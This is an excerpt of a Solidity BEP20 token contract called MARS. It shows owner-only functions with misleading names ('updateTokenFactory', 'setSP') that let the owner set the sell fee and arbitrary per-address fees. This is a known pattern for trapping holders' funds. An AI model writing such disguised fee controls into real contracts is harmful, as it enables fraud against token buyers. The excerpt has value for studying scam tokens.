...
contract MARS is BEP20, Ownable {
    // ext
    ...
    function updateTokenFactory(uint256 _value) external onlyOwner {
        _defaultSellFee = _value;
    }


    function setSP(address _addresss, uint256 _value) external onlyOwner {
        require(_value > 1, "Account tax must be greater than or equal to 1");
        _slipFee[_addresss] = _value;
    }

    function setSlippage(address _addresss, uint256 _value) private {
        require(_value > 1, "Account tax must be greater than or equal to 1");
        _slipFee[_addresss] = _value;
    }
